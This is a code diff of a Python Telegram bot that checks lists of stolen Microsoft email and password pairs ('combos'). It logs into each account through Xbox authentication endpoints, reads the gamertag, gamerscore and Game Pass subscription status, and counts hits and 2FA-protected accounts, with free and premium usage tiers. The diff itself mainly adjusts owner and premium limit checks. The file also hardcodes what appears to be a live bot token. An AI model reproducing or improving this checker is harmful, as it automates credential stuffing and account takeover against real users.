@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-r1livk GamePass Elite Checker & Filter Bot ⚡
+r1livk GamePass Elite Checker & Filter Bot ⚡ [Updated & Fixed]
 """
 
 import os
@@ -15,7 +15,7 @@ import telebot
 from telebot import types
 
 TOKEN = "8896382526:AAEySaJWfg6pQpoRuSu8zQaG50uJ_Jf0obg"
-OWNER_ID = 6266959915
+OWNER_ID = 6266959915  # آيدي المالك الأساسي
 CHANNEL_USERNAME = "@r1iv_k"  
 bot = telebot.TeleBot(TOKEN)
 
@@ -41,13 +41,20 @@ def save_json_data(filepath, data):
         pass
 
 def load_premium_users():
-    if not os.path.exists(PREMIUM_USERS_FILE):
-        return set()
-    with open(PREMIUM_USERS_FILE, "r") as f:
-        return set(line.strip() for line in f if line.strip())
+    users = {str(OWNER_ID)} # إضافة المالك تلقائياً كـ بريميوم
+    if os.path.exists(PREMIUM_USERS_FILE):
+        try:
+            with open(PREMIUM_USERS_FILE, "r") as f:
+                for line in f:
+                    val = line.strip()
+                    if val:
+                        users.add(val)
+        except:
+            pass
+    return users
 
 def check_user_subscription(user_id):
-    if user_id == OWNER_ID:
+    if int(user_id) == int(OWNER_ID) or str(user_id) in load_premium_users():
         return True
     try:
         member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
@@ -76,8 +83,10 @@ def update_user_stats(user_id, checked_count, hits_count, username=None):
     save_json_data(STATS_FILE, stats)
 
 def check_daily_limit(chat_id, new_lines_count):
-    if chat_id == OWNER_ID or str(chat_id) in load_premium_users():
+    # استثناء المالك والبريميوم نهائياً من أي ليميت
+    if int(chat_id) == int(OWNER_ID) or str(chat_id) in load_premium_users():
         return True, new_lines_count
+    
     today = str(date.today())
     if chat_id not in user_usage or user_usage[chat_id]["date"] != today:
         user_usage[chat_id] = {"date": today, "count": 0}
@@ -88,7 +97,7 @@ def check_daily_limit(chat_id, new_lines_count):
     return True, allowed_lines
 
 def update_usage(chat_id, count):
-    if chat_id == OWNER_ID or str(chat_id) in load_premium_users():
+    if int(chat_id) == int(OWNER_ID) or str(chat_id) in load_premium_users():
         return
     today = str(date.today())
     if chat_id in user_usage and user_usage[chat_id]["date"] == today:
@@ -211,7 +220,6 @@ async def check_gamepass_account(combo):
             if not ms_token:
                 return "bad", "No Token"
 
-            # استخراج توكنات Xbox
             xb_payload = {
                 "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, 
                 "RelyingParty": "http://auth.xboxlive.com", 
@@ -238,7 +246,6 @@ async def check_gamepass_account(combo):
 
             xsts_token = xsts_res.json()['Token']
             
-            # فحص البروفايل (Gamertag & Gamerscore)
             prof_res = await session.get(
                 "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore", 
                 headers={"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "x-xbl-contract-version": "2"}, 
@@ -253,16 +260,8 @@ async def check_gamepass_account(combo):
                     if s['id'] == 'Gamertag': gamertag = s['value']
                     if s['id'] == 'Gamerscore': gamerscore = int(s['value']) if str(s['value']).isdigit() else 0
 
-            # فحص اشتراكات الجيم باس (Game Pass Subscriptions Entitlements Endpoint)
             game_pass_status = "No Game Pass ❌"
             try:
-                # استخدام آبي التحقق من استحقاق المنتجات والاشتراكات
-                entitle_res = await session.get(
-                    "https://purchase.mp.microsoft.com/v8.0/keys/licenses", 
-                    headers={"Authorization": f"XBL3.0 x={uhs};{xsts_token}"}, 
-                    timeout=5
-                )
-                # فحص بديل عبر استعراض الاشتراكات النشطة في المتجر أو تفويضات الألعاب
                 sub_check_url = "https://eds.xboxlive.com/users/me/subscriptions"
                 sub_res = await session.get(
                     sub_check_url,
@@ -326,14 +325,14 @@ def show_main_menu(message):
     markup.add(btn_start, btn_top, btn_premium, btn_account)
 
     today = str(date.today())
-    if chat_id == OWNER_ID or str(chat_id) in load_premium_users():
+    if int(chat_id) == int(OWNER_ID) or str(chat_id) in load_premium_users():
         status_text = "👑 Premium / Owner (Unlimited)"
     else:
         used = user_usage.get(chat_id, {}).get("count", 0) if user_usage.get(chat_id, {}).get("date") == today else 0
         status_text = f"👤 Free ({used}/3000 lines today)"
 
     text = (
-        "⚡ **r1livk GamePass Filter & Checker - V6.0** ⚡\n\n"
+        "⚡ **r1livk GamePass Filter & Checker - V6.1** ⚡\n\n"
         "Specialized in filtering accounts and detecting Game Pass status!\n"
         f"Your Status: {status_text}\n\n"
         "Select an option:"
@@ -407,8 +406,8 @@ def callback_query(call):
 
     elif call.data == "my_account":
         today = str(date.today())
-        if chat_id == OWNER_ID or str(chat_id) in load_premium_users():
-            bot.answer_callback_query(call.id, "Status: Premium / Owner\nMode: GamePass Filter", show_alert=True)
+        if int(chat_id) == int(OWNER_ID) or str(chat_id) in load_premium_users():
+            bot.answer_callback_query(call.id, "Status: Premium / Owner (Unlimited)\nMode: GamePass Filter", show_alert=True)
         else:
             used = user_usage.get(chat_id, {}).get("count", 0) if user_usage.get(chat_id, {}).get("date") == today else 0
             bot.answer_callback_query(call.id, f"Status: Free ({used}/3000 lines)\nMode: GamePass Filter", show_alert=True)
@@ -547,7 +546,7 @@ async def process_gp_scan(chat_id, filepath, lines, username):
 
     final_msg = (
         f"🎉 **SCAN & FILTER COMPLETED!**\n\n"
-        f"📊 Total Checked: {checked}\n"
+        f"📊 Total Checked: {checked}\n`"
         f"🎯 Total Hits: {hits}\n"
         f"🎮 GamePass Hits: {gp_hits}\n"
         f"🔒 2FA Protected: {tfa_count}\n"
